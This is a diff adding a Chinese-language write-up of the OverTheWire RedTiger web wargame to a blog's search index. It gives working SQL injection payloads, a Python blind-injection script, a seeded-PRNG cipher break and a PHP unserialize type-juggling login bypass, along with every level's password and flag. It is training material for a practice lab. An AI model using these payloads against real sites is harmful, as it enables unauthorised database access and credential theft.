@@ -17657,4 +17657,196 @@ gibson-1 with full SSH environment, buffer =
         <tag>utumno</tag>
       </tags>
   </entry>
+  <entry>
+    <title>OverTheWire - RedTiger</title>
+    <url>/wp/OverTheWire/OverTheWire-RedTiger/</url>
+    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly9yZWR0aWdlci5sYWJzLm92ZXJ0aGV3aXJlLm9yZy8=">RedTiger's
+Hackit<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>https://redtiger.labs.overthewire.org</p>
+</blockquote>
+<p>RedTiger 是一个纯 Web 安全的 wargame，共 10 关，全是 SQL
+注入（最后一关是 PHP 反序列化），从简单到复杂。</p>
+<p>解法记录如下。</p>
+<h1 id="level-1-simple-sql-injection">Level 1 — Simple
+SQL-Injection</h1>
+<p>目标：获取 Hornoxe 用户的密码</p>
+<p>表名：<code>level1_users</code></p>
+<p>页面 GET 参数 <code>?cat=N</code> 存在数字型注入，原始 SQL 类似：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> col1, col2, col3, col4 <span class="keyword">FROM</span> some_table <span class="keyword">WHERE</span> cat<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这里 <code>cat</code> 参数查的是分类表，和登录无关。登录查询针对
+<code>level1_users</code> 表。回显第 3、4 列。UNION 注入枚举 4
+列即可：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?cat<span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,username,password <span class="keyword">FROM</span> level1_users</span><br></pre></td></tr></table></figure>
+<p>拿到 Hornoxe 的密码：<code>thatwaseasy</code></p>
+<p>登录后拿到 flag 和 Level 2 密码。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">27cbddc803ecde822d87a7e8639f9315</span></span>
+<p>Level 2
+密码：<code>passwords_will_change_over_time_let_us_do_a_shitty_rhyme</code></p>
+<h1 id="level-2-simple-login-bypass">Level 2 — Simple login-bypass</h1>
+<p>目标：登录绕过</p>
+<p>用 Level 1 密码通过 Cookie <code>level2login</code>
+认证后，页面显示登录表单。</p>
+<p>SQL 类似（表名推测，页面未给出）：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>直接在 password 字段用 <code>' OR '1'='1</code> 绕过条件验证。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">1222e2d4ad5da677efb188550528bfaa</span></span>
+<p>Level 3 密码：<code>feed_the_cat_who_eats_your_bread</code></p>
+<h1 id="level-3-get-an-error">Level 3 — Get an error</h1>
+<p>目标：获取 Admin 的密码</p>
+<p>表名：<code>level3_users</code></p>
+<p>页面用 <code>usr</code> 参数查询用户详情。该参数经过
+<code>urlcrypt.inc</code> 的解密函数处理：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">srand</span>(<span class="number">3284724</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="variable">$i</span>, <span class="number">1</span>)) ^ <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$temp</span>) &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>.<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$cryptedstr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">srand</span>(<span class="number">3284724</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span> += <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="variable">$i</span>, <span class="number">3</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">                <span class="variable">$a</span> = <span class="variable">$s</span> ^ <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">                <span class="variable">$decStr</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>srand(3284724)</code> 固定种子，<code>rand(0, 255)</code>
+序列可预测。</p>
+<p>两个已知加密值： - <code>MDQyMjExMDE0MTgyMTQw</code> -&gt; decrypt
+-&gt; <code>Admin</code> - <code>MDYzMjIzMDA2MTU2MTQxMjU0</code> -&gt;
+decrypt -&gt; <code>TheCow</code></p>
+<p>通过 glibc <code>srand(3284724)</code> + <code>rand()</code> + PHP
+RAND_RANGE 宏可以算出 rand(0,255) 序列（前几个：107, 183, 99, 223, 226,
+137...）。用 C 程序生成 200 个 key：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(<span class="number">3284724</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, (<span class="type">int</span>)(<span class="number">256.0</span> * rand() / (RAND_MAX + <span class="number">1.0</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>加密 SQL 注入 payload 后用 <code>usr</code> 参数传入。表有 7
+列，列映射为：</p>
+<ul>
+<li>Username=2, First name=6, Name=7, ICQ=5, Email=4</li>
+<li>id=1, password=7</li>
+</ul>
+<p>Payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;</span><span class="number">1</span><span class="string">&#x27;,group_concat(password),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">7</span><span class="string">&#x27; from level3_users#</span></span><br></pre></td></tr></table></figure>
+<p>加密后访问拿到 Admin 密码。列映射来自第三方
+writeup，实际列顺序可能有变动。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">thisisaverysecurepasswordEEE5rt</span></span>
+<p>Level 4 密码：<code>put_the_kitten_on_your_head</code></p>
+<h1 id="level-4-blind-injection">Level 4 — Blind Injection</h1>
+<p>目标：获取表 <code>level4_secret</code> 中 <code>keyword</code>
+列的第一个值</p>
+<p>URL 参数：<code>?id=N</code></p>
+<p>页面提示：</p>
+<ul>
+<li><code>LIKE</code> 被禁用</li>
+<li>唯一需要盲注的关卡</li>
+</ul>
+<p><code>?id=1</code> 返回
+<code>Query returned 1 rows.</code>，<code>?id=0</code> 返回
+<code>0 rows</code>。</p>
+<p>列数：2 列（<code>?id=1 UNION SELECT 1,2</code> 返回 2 rows）</p>
+<p>盲注脚本逐位提取 keyword：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;level4login&#x27;</span>: <span class="string">&#x27;put_the_kitten_on_your_head&#x27;</span>&#125;</span><br><span class="line">keyword = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">22</span>):</span><br><span class="line">    bit = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 判断 bit 长度</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;if((select length(bin(ascii(substr(keyword,<span class="subst">&#123;i&#125;</span>,1)))) from level4_secret limit 1)=7,1,0)&#x27;</span>&#125;</span><br><span class="line">    r = requests.get(url, cookies=cookies, params=payload)</span><br><span class="line">    bit_len = <span class="number">7</span> <span class="keyword">if</span> <span class="string">&#x27;Query returned 1 rows&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">else</span> <span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, bit_len+<span class="number">1</span>):</span><br><span class="line">        payload = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;if((select substr(bin(ascii(substr(keyword,<span class="subst">&#123;i&#125;</span>,1))),<span class="subst">&#123;j&#125;</span>,1) from level4_secret limit 1)=0,1,0)&#x27;</span>&#125;</span><br><span class="line">        r = requests.get(url, cookies=cookies, params=payload)</span><br><span class="line">        bit += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> <span class="string">&#x27;Query returned 1 rows&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    keyword += <span class="built_in">chr</span>(<span class="built_in">int</span>(bit, <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(keyword)  <span class="comment"># killstickswithbr1cks!</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">killstickswithbr1cks!</span></span>
+<p>Level 5 密码：<code>this_hack_it's_old</code></p>
+<h1 id="level-5-advanced-login-bypass">Level 5 — Advanced
+login-bypass</h1>
+<p>目标：绕过登录</p>
+<p>禁用：<code>substring, substr, (, ), mid</code></p>
+<p>提示：密码是 MD5 加密的</p>
+<p>注入点在登录表单。表有 2 列。用 UNION 注入自定义用户和已知 MD5
+值：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>c81e728d9d4c2f636f067f89cc14862c<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+<p><code>c81e728d9d4c2f636f067f89cc14862c</code> 是 <code>2</code> 的
+MD5。服务端验证流程是：查询用户名和 MD5 密码，然后将输入密码 MD5
+后比较。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ca5c3c4f0bc85af1392aef35fc1d09b3</span></span>
+<p>Level 6 密码：<code>the_stone_is_cold</code></p>
+<h1 id="level-6-sql-injection">Level 6 — SQL-Injection</h1>
+<p>目标：获取 <code>level6_users</code> 表中 <code>status=1</code>
+的第一个用户</p>
+<p>参数：<code>?user=N</code></p>
+<p>这是一个 UNION 注入。页面先查询用户
+ID，再用返回的数据构造第二个查询。5 列。</p>
+<p>Payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,id,3,password,5 from level6_users where status=1 #</span></span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<ul>
+<li>Username: 3</li>
+<li>Email: m0nsterk1ll</li>
+</ul>
+<p>密码 <code>m0nsterk1ll</code> 登录成功。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">074113b268d87dea21cc839954dec932</span></span>
+<p>Level 7 密码：<code>shitcoins_are_hold</code></p>
+<h1 id="level-7-sql-injection">Level 7 — SQL-Injection</h1>
+<p>目标：获取发布 google 新闻的用户名（<code>level7_news</code>
+表，<code>autor</code> 列）</p>
+<p>限制：禁用 <code>substr, substring, ascii, mid, like, --</code>（no
+comments）</p>
+<p>原始查询涉及 JOIN，错误信息泄露了结构：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> news.<span class="operator">*</span>, text.text, text.title</span><br><span class="line"><span class="keyword">FROM</span> level7_news news, level7_texts text</span><br><span class="line"><span class="keyword">WHERE</span> text.id <span class="operator">=</span> news.id <span class="keyword">AND</span> (text.text <span class="keyword">LIKE</span> <span class="string">&#x27;%$input%&#x27;</span> <span class="keyword">OR</span> text.title <span class="keyword">LIKE</span> <span class="string">&#x27;%$input%&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><code>$input</code> 在 SQL 中出现两次，注释符被禁用，故用 MySQL 的
+<code>"</code> 做 quote-balancing：</p>
+<p>payload 的 <code>"</code>（第 1 列）在 MySQL
+默认模式下开启一个双引号字符串，吃掉第二次注入点及之间的所有内容（包括
+<code>OR text.title LIKE</code> 分支），直到第二次
+<code>union select</code> 后的 <code>"</code>
+才闭合。<code>('</code>（第 4 列）和模板残留的 <code>%'</code> 拼接成
+<code>('%')</code>，是一个合法的括起来的字符串表达式。最终 UNION SELECT
+返回 4 列。</p>
+<p><code>id=3</code> 是 google 新闻在表中的条目 ID（通过枚举
+<code>text.title</code> 确定）。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">goo<span class="operator">%</span><span class="string">&#x27;) union select &quot;,2,(select group_concat(autor) from level7_news where id=3),(&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>返回 autor：<code>TestUserforg00gle</code></p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">970cecc0355ed85306588a1a01db4d80</span></span>
+<p>Level 8 密码：<code>or_so_i'm_told</code></p>
+<h1 id="level-8-sql-injection">Level 8 — SQL-Injection</h1>
+<p>目标：获取 admin 的密码</p>
+<p>用户信息编辑页面，注入点在 email 字段（没有转义）。</p>
+<p>SQL 为 UPDATE 语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> &#123;<span class="keyword">table</span>&#125; <span class="keyword">SET</span> name<span class="operator">=</span><span class="string">&#x27;$input&#x27;</span>, email<span class="operator">=</span><span class="string">&#x27;$input&#x27;</span>, icq<span class="operator">=</span><span class="string">&#x27;$input&#x27;</span>, age<span class="operator">=</span><span class="string">&#x27;$input&#x27;</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>在 email 字段注入，将 password 写入 name
+字段利用回显读取。子查询从待更新的用户表（<code>level8_users</code>）中读取管理员密码。MySQL
+不允许 UPDATE 的子查询直接引用目标表，需用 derived table 绕一层：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;, name=(select password from (select password from level8_users limit 1) as t), email=&#x27;</span>a</span><br></pre></td></tr></table></figure>
+<p>执行后页面显示 Name 字段变成密码值。</p>
+<p><code>19JPYS1jdgvkj</code></p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">9ea04c5d4f90dae92c396cf7a6787715</span></span>
+<p>Level 9 密码：<code>network_pancakes_milk_and_wine</code></p>
+<h1 id="level-9-sql-injection">Level 9 — SQL-Injection</h1>
+<p>目标：获取任意用户的用户名和密码</p>
+<p>表名：<code>level9_users</code>（数据源表）</p>
+<p>这是一个 INSERT 注入。页面有提交表单（author, title,
+text）。注意涉及两个表：INSERT 写入一个内容表（如
+<code>level9_news</code>），子查询从 <code>level9_users</code>
+读取目标数据。</p>
+<p><code>=</code> 被过滤，但可以通过闭合括号注入：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;),((select username from level9_users),(select password from level9_users),&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>或者用 <code>updatexml()</code> 做 error-based 注入：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a<span class="string">&#x27; or updatexml(2,concat(0x2e,(select username from level9_users)),0) or &#x27;</span></span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<ul>
+<li>Username: <code>TheBlueFlower</code></li>
+<li>Password: <code>this_oassword_is_SEC//Ure.promised!</code></li>
+</ul>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">84ec870f1ac294508400e30d8a26a679</span></span>
+<p>Level 10 密码：<code>whatever_just_a_fresh_password</code></p>
+<h1 id="level-10">Level 10</h1>
+<p>目标：以 TheMaster 身份登录</p>
+<p>页面有一个隐藏的 login 字段，值是 base64 编码的 PHP 序列化数据：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Welcome to Level 10<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">Target: Bypass the login. Login as TheMaster<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">    <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;login&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">value</span>=<span class="string">&quot;YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dologin&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>解码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>PHP <code>unserialize()</code> 反序列化后做 <code>==</code>
+比较，后端大致逻辑：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>-&gt;username == <span class="string">&#x27;TheMaster&#x27;</span> &amp;&amp; <span class="variable">$data</span>-&gt;password == <span class="variable">$db_password</span>) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
+<p>利用 PHP 类型转换漏洞：当 <code>bool</code> 和 <code>string</code> 用
+<code>==</code> 比较时，<code>true == "任何字符串"</code> 恒为
+<code>true</code>，password 比较永远通过。</p>
+<p>构造 Serialize：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line">b:1;   → boolean true</span><br></pre></td></tr></table></figure>
+<p>base64：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=</span><br></pre></td></tr></table></figure>
+<p>The password for the hall of fame is:
+*****************************</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">721ce43d433ad85bcfa56644b112fa52</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>overthewire</tag>
+        <tag>redtiger</tag>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
 </search>
